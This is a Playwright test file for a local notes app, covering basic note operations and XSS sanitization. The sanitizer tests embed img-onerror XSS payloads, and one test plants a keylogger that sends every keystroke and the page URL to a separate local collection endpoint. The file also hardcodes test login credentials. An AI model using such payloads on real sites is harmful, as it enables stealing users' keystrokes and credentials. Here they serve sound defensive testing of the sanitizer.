import { test, expect } from '@playwright/test';

// Extend Window interface for XSS test variables
declare global {
  interface Window {
    xssExecuted?: boolean;
    xssBlocked?: boolean;
    keyloggerActive?: boolean;
  }
}

test.beforeEach(async ({ page, request }) => {
  // Log in
  const res = await request.post('http://localhost:3001/login', {
    data: { username: 'tamarr', password: 'tamarr' }
  });
  const { token, user } = await res.json();

  // Set token and user in localStorage
  await page.addInitScript(([token, user]) => {
    window.localStorage.setItem('token', token);
    window.localStorage.setItem('user', JSON.stringify(user));
  }, [token, user]);

  await page.goto('http://localhost:3000');
});

test.describe('Notes App CRUD', () => {

  test('Create a new note', async ({ page }) => {
    await page.goto('http://localhost:3000');

    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'tamarr');
    await page.fill('[data-testid="login_form_password"]', 'tamarr');
    await page.click('[data-testid="login_form_login"]');

    // Check for logout button as a sign of successful login
    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    await page.getByRole('button', { name: 'Add New Note' }).click();

    const textbox = page.locator('[name="text_input_new_note"]');
    await textbox.waitFor({ state: 'visible', timeout: 10000 });
    await textbox.fill('Test Note');

    // Click the save button
    const saveButton = page.locator('[name="text_input_save_new_note"]');
    await saveButton.waitFor({ state: 'visible', timeout: 10000 });
    await saveButton.click();

    // Verify notification
    const notification = page.locator('.notification');
    await expect(notification).toHaveText('Added a new note', { timeout: 10000 });
  });

  test('Read notes from server', async ({ page }) => {
    const notes = page.locator('.note');
    await expect(notes.first()).toBeVisible();
  
    const firstNoteTitle = notes.first().locator('h2');
    await expect(firstNoteTitle).not.toBeEmpty();
  });
  

  test('Update an existing note', async ({ page }) => {
    await page.goto('http://localhost:3000');

    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'tamarr');
    await page.fill('[data-testid="login_form_password"]', 'tamarr');
    await page.click('[data-testid="login_form_login"]');

    // Check for logout button as a sign of successful login
    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    const editButton = page.locator('[data-testid^="edit-"]').first();
    await editButton.waitFor({ state: 'visible', timeout: 5000 });
    await editButton.click();

    const textarea = page.locator('[data-testid^="text_input-"]').first();
    await textarea.waitFor({ state: 'visible', timeout: 5000 });
    await textarea.fill('Updated Note Content');

    const saveButton = page.locator('[data-testid^="text_input_save-"]').first();
    await saveButton.waitFor({ state: 'visible', timeout: 5000 });
    await saveButton.click();

    const notification = page.locator('.notification');
    await expect(notification).toHaveText('Note updated', { timeout: 5000 });
  });

  test('Delete a note', async ({ page }) => {
    await page.goto('http://localhost:3000');

    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'tamarr');
    await page.fill('[data-testid="login_form_password"]', 'tamarr');
    await page.click('[data-testid="login_form_login"]');

    // Check for logout button as a sign of successful login
    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    const deleteButton = page.locator('[name^="delete-"]').first();
    await deleteButton.waitFor({ state: 'visible', timeout: 5000 });
    await deleteButton.click();

    const notification = page.locator('.notification');
    await expect(notification).toHaveText('Note deleted', { timeout: 5000 });
  });

  test('Pagination buttons exist', async ({ page }) => {
    await expect(page.getByRole('button', { name: 'First' })).toBeVisible();
    await expect(page.getByRole('button', { name: 'Last' })).toBeVisible();
  });

  
});

test.describe('Rich Notes XSS and Sanitization', () => {

  test('Create and render rich HTML note with sanitizer ON', async ({ page }) => {
    await page.goto('http://localhost:3000');
    
    // Login first
    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'tamarr');
    await page.fill('[data-testid="login_form_password"]', 'tamarr');
    await page.click('[data-testid="login_form_login"]');
    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    
    // Ensure sanitizer is ON
    await page.check('[data-testid="sanitizer-on"]');
    
    // Create a rich HTML note
    await page.getByRole('button', { name: 'Add New Note' }).click();
    
    const richHtmlContent = '<b>Bold text</b> and <i>italic text</i>';
    await page.fill('[name="text_input_new_note"]', richHtmlContent);
    await page.click('[name="text_input_save_new_note"]');
    
    // Verify the note was created
    await expect(page.locator('.notification')).toHaveText('Added a new note', { timeout: 10000 });
    
    // Wait for the note to be rendered and navigate to page 1 where new notes appear
    await page.waitForTimeout(1000);
    
    // Click "First" button to go to page 1 where the newly created note is
    await page.click('[name="first"]');
    await page.waitForTimeout(500);
    
    // Find the note that contains our rich HTML content
    const noteContent = page.locator('.note-content').filter({ hasText: 'Bold text' }).first();
    
    // Check that the HTML content contains the tags
    const htmlContent = await noteContent.innerHTML();
    expect(htmlContent).toContain('<b>Bold text</b>');
    expect(htmlContent).toContain('<i>italic text</i>');
    
    // Also verify the elements are visually present
    await expect(noteContent.locator('b')).toBeVisible();
    await expect(noteContent.locator('i')).toBeVisible();
    
    // Cleanup: Delete the test note
    await noteContent.locator('..').locator('[name^="delete-"]').click();
    await expect(page.locator('.notification')).toHaveText('Note deleted', { timeout: 5000 });
  });

  test('XSS vulnerability when sanitizer is OFF', async ({ page }) => {
    await page.goto('http://localhost:3000');
    
    // Login first
    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'tamarr');
    await page.fill('[data-testid="login_form_password"]', 'tamarr');
    await page.click('[data-testid="login_form_login"]');
    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    
    // Turn OFF sanitizer
    await page.check('[data-testid="sanitizer-off"]');
    
    // Create a note with XSS payload
    await page.getByRole('button', { name: 'Add New Note' }).click();
    
    // Use img tag with onerror for XSS (more likely to work than script tags)
    const xssPayload = '<img src="nonexistent.jpg" onerror="window.xssExecuted = true; console.log(\'XSS executed!\');">';
    await page.fill('[name="text_input_new_note"]', xssPayload);
    await page.click('[name="text_input_save_new_note"]');
    
    // Wait for note to be created
    await expect(page.locator('.notification')).toHaveText('Added a new note', { timeout: 10000 });
    
    // Check if XSS was executed by evaluating JavaScript
    const xssExecuted = await page.evaluate(() => window.xssExecuted);
    expect(xssExecuted).toBe(true);
    
    // Cleanup: Delete the XSS test note
    await page.click('[name="first"]');
    await page.waitForTimeout(500);
    await page.locator('[name^="delete-"]').first().click();
    await expect(page.locator('.notification')).toHaveText('Note deleted', { timeout: 5000 });
  });

  test('XSS blocked when sanitizer is ON', async ({ page }) => {
    await page.goto('http://localhost:3000');
    
    // Login first  
    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'tamarr');
    await page.fill('[data-testid="login_form_password"]', 'tamarr');
    await page.click('[data-testid="login_form_login"]');
    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    
    // Ensure sanitizer is ON
    await page.check('[data-testid="sanitizer-on"]');
    
    // Create a note with XSS payload
    await page.getByRole('button', { name: 'Add New Note' }).click();
    
    const xssPayload = '<img src="nonexistent.jpg" onerror="window.xssBlocked = true; console.log(\'XSS should be blocked!\');">';
    await page.fill('[name="text_input_new_note"]', xssPayload);
    await page.click('[name="text_input_save_new_note"]');
    
    // Wait for note to be created
    await expect(page.locator('.notification')).toHaveText('Added a new note', { timeout: 10000 });
    
    // Check that XSS was NOT executed
    const xssBlocked = await page.evaluate(() => window.xssBlocked);
    expect(xssBlocked).toBeUndefined();
    
    // Verify the dangerous attributes were removed
    const noteContent = page.locator('.note-content').first();
    const imgElement = noteContent.locator('img');
    if (await imgElement.count() > 0) {
      const onerrorAttr = await imgElement.getAttribute('onerror');
      expect(onerrorAttr).toBeNull();
    }
    
    // Cleanup: Delete the blocked XSS test note
    await page.click('[name="first"]');
    await page.waitForTimeout(500);
    await page.locator('[name^="delete-"]').first().click();
    await expect(page.locator('.notification')).toHaveText('Note deleted', { timeout: 5000 });
  });

  test('Keylogger payload demonstration', async ({ page }) => {
    await page.goto('http://localhost:3000');
    
    // Login first
    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'tamarr');
    await page.fill('[data-testid="login_form_password"]', 'tamarr');
    await page.click('[data-testid="login_form_login"]');
    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    
    // Turn OFF sanitizer to allow XSS
    await page.check('[data-testid="sanitizer-off"]');
    
    // Create a note with keylogger payload
    await page.getByRole('button', { name: 'Add New Note' }).click();
    
    // Keylogger payload using img onerror
    const keyloggerPayload = `<img src="x" onerror="
      document.addEventListener('keydown', function(e) {
        fetch('http://localhost:3002/keylog', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key: e.key, url: window.location.href })
        }).catch(() => {});
      });
      window.keyloggerActive = true;
    ">`;
    
    await page.fill('[name="text_input_new_note"]', keyloggerPayload);
    await page.click('[name="text_input_save_new_note"]');
    
    // Wait for note to be created
    await expect(page.locator('.notification')).toHaveText('Added a new note', { timeout: 10000 });
    
    // Check if keylogger was activated
    const keyloggerActive = await page.evaluate(() => window.keyloggerActive);
    expect(keyloggerActive).toBe(true);
    
    // Cleanup: Delete the keylogger test note
    await page.click('[name="first"]');
    await page.waitForTimeout(500);
    await page.locator('[name^="delete-"]').first().click();
    await expect(page.locator('.notification')).toHaveText('Note deleted', { timeout: 5000 });
  });

  test('Sanitizer toggle functionality', async ({ page }) => {
    await page.goto('http://localhost:3000');
    
    // Check that sanitizer controls are visible
    await expect(page.locator('[data-testid="sanitizer-on"]')).toBeVisible();
    await expect(page.locator('[data-testid="sanitizer-off"]')).toBeVisible();
    
    // Verify default state (sanitizer should be ON by default)
    await expect(page.locator('[data-testid="sanitizer-on"]')).toBeChecked();
    await expect(page.locator('[data-testid="sanitizer-off"]')).not.toBeChecked();
    
    // Toggle to OFF
    await page.check('[data-testid="sanitizer-off"]');
    await expect(page.locator('[data-testid="sanitizer-off"]')).toBeChecked();
    await expect(page.locator('[data-testid="sanitizer-on"]')).not.toBeChecked();
    
    // Toggle back to ON
    await page.check('[data-testid="sanitizer-on"]');
    await expect(page.locator('[data-testid="sanitizer-on"]')).toBeChecked();
    await expect(page.locator('[data-testid="sanitizer-off"]')).not.toBeChecked();
  });

});
